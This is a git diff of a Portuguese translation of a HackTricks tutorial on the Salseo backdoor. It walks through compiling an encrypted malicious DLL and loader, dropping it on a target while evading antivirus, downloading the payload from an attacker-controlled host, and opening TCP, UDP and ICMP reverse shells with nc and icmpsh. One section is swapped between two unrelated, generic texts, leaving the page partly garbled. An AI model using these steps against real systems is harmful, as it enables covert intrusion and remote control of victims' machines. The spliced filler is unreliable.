@@ -8,7 +8,7 @@
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
@@ -39,66 +39,38 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-### Enumeração de usuários
+### Introdução
 
-#### Salsa-tools
+O Windows é o sistema operacional mais utilizado no mundo, o que o torna um alvo popular para hackers. Nesta seção, discutiremos algumas técnicas de backdoor que podem ser usadas em sistemas Windows.
 
-Salsa-tools é uma ferramenta que permite a enumeração de usuários em um ambiente Windows. Ele pode ser usado para encontrar usuários que não estão visíveis no Gerenciador de Usuários do Windows.
+### Backdoors
 
-Para usá-lo, basta executar o seguinte comando:
+#### Backdoor de Registro
 
-```
-salsa-tools.exe enumusers
-```
+O registro do Windows é um banco de dados que armazena configurações e opções para o sistema operacional e para os programas instalados. Um backdoor pode ser adicionado ao registro para permitir que um invasor acesse o sistema sem ser detectado. Isso pode ser feito adicionando uma chave de registro que executa um comando ou script malicioso.
 
-Este comando irá listar todos os usuários do sistema, incluindo aqueles que estão ocultos.
+#### Backdoor de Serviço
 
-#### Comando Net
+Os serviços do Windows são programas que são executados em segundo plano e fornecem funcionalidades para o sistema operacional e para os programas instalados. Um backdoor pode ser adicionado como um serviço para permitir que um invasor acesse o sistema sem ser detectado. Isso pode ser feito criando um serviço que executa um comando ou script malicioso.
 
-O comando `net` também pode ser usado para listar usuários em um sistema Windows. Para listar todos os usuários, basta executar o seguinte comando:
+#### Backdoor de Arquivo
 
-```
-net user
-```
+Um backdoor pode ser adicionado a um arquivo executável do Windows para permitir que um invasor acesse o sistema sem ser detectado. Isso pode ser feito injetando código malicioso no arquivo executável ou anexando um arquivo executável malicioso a um arquivo legítimo.
 
-Este comando irá listar todos os usuários do sistema.
+### Conclusão
 
-Para listar informações detalhadas sobre um usuário específico, basta executar o seguinte comando:
-
-```
-net user <username>
-```
-
-Substitua `<username>` pelo nome de usuário que você deseja obter informações.
-
-#### Ferramenta WMIC
-
-A ferramenta WMIC (Windows Management Instrumentation Command-line) também pode ser usada para listar usuários em um sistema Windows. Para listar todos os usuários, basta executar o seguinte comando:
-
-```
-wmic useraccount list brief
-```
-
-Este comando irá listar todos os usuários do sistema.
-
-Para listar informações detalhadas sobre um usuário específico, basta executar o seguinte comando:
-
-```
-wmic useraccount where name='<username>' get *
-```
-
-Substitua `<username>` pelo nome de usuário que você deseja obter informações.
+Existem várias técnicas de backdoor que podem ser usadas em sistemas Windows. É importante que os administradores de sistemas estejam cientes dessas técnicas e tomem medidas para proteger seus sistemas contra elas.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
 Ok, agora você tem tudo o que precisa para executar todo o processo Salseo: o **EvilDalsa.dll codificado** e o **binário do SalseoLoader.**
 
-**Faça o upload do binário SalseoLoader.exe para a máquina. Eles não devem ser detectados por nenhum AV...**
+**Faça o upload do binário SalseoLoader.exe na máquina. Eles não devem ser detectados por nenhum AV...**
 
 ## **Executando a backdoor**
 
-### **Obtendo um shell reverso TCP (baixando o dll codificado por HTTP)**
+### **Obtendo um shell reverso TCP (baixando o dll codificado através do HTTP)**
 
 Lembre-se de iniciar um nc como ouvinte de shell reverso e um servidor HTTP para servir o evilsalsa codificado.
 ```
@@ -114,14 +86,14 @@ SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <A
 
 **Desta vez, você precisa de uma ferramenta especial no cliente para receber o shell reverso. Baixe:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
-#### **Desativando Respostas ICMP:**
+#### **Desativando as respostas ICMP:**
 ```
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-#### Executar o cliente:
+#### Executando o cliente:
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
@@ -143,11 +115,11 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
 
-#### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**
+#### **Procure pelo pacote DllExport (usando a guia Procurar), e pressione Instalar (e aceite o popup)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1).png>)
 
-Na pasta do seu projeto, aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**
+Na pasta do seu projeto aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**
 
 ### **D**esinstale o DllExport
 
@@ -161,7 +133,7 @@ Apenas **saia** do Visual Studio
 
 Em seguida, vá para a sua pasta **SalseoLoader** e **execute DllExport\_Configure.bat**
 
-Selecione **x64** (se você for usá-lo dentro de uma caixa x64, que foi o meu caso), selecione **System.Runtime.InteropServices** (dentro do **Namespace para DllExport**) e pressione **Aplicar**
+Selecione **x64** (se você for usá-lo dentro de uma caixa x64, esse foi o meu caso), selecione **System.Runtime.InteropServices** (dentro do **Namespace para DllExport**) e pressione **Aplicar**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1).png>)
 
@@ -169,11 +141,11 @@ Selecione **x64** (se você for usá-lo dentro de uma caixa x64, que foi o meu c
 
 **\[DllExport]** não deve mais ser marcado como erro
 
-![](<../.gitbook/assets/image (8) (1).png>)
+![](<../.gitbook/assets/image (8) (1) (1).png>)
 
 ### Compile a solução
 
-Selecione **Tipo de Saída = Biblioteca de Classes** (Projeto --> Propriedades do SalseoLoader --> Aplicativo --> Tipo de Saída = Biblioteca de Classes)
+Selecione **Tipo de Saída = Biblioteca de Classes** (Projeto --> Propriedades do SalseoLoader --> Aplicativo --> Tipo de saída = Biblioteca de Classes)
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
@@ -195,7 +167,7 @@ Se nenhum erro aparecer, provavelmente você tem uma DLL funcional!!
 
 ## Obter um shell usando a DLL
 
-Não se esqueça de usar um **servidor HTTP** e configurar um **listener nc**
+Não se esqueça de usar um **servidor HTTP** e configurar um **ouvinte nc**
 
 ### Powershell
 ```
@@ -208,7 +180,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (ou Command Prompt) é um aplicativo de linha de comando do Windows que permite aos usuários interagir com o sistema operacional por meio de comandos de texto. Ele pode ser usado para executar várias tarefas, como gerenciamento de arquivos, configuração de rede e execução de scripts. O CMD também pode ser usado para executar comandos maliciosos, como instalar backdoors ou roubar informações confidenciais. É importante estar ciente desses riscos e tomar medidas para proteger seu sistema contra ataques de CMD.
+CMD (Command Prompt) é uma ferramenta de linha de comando do Windows que permite aos usuários interagir com o sistema operacional por meio de comandos. É uma ferramenta poderosa para hackers, pois permite executar comandos rapidamente e sem a necessidade de uma interface gráfica. Além disso, muitas ferramentas de hacking são executadas por meio do CMD.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
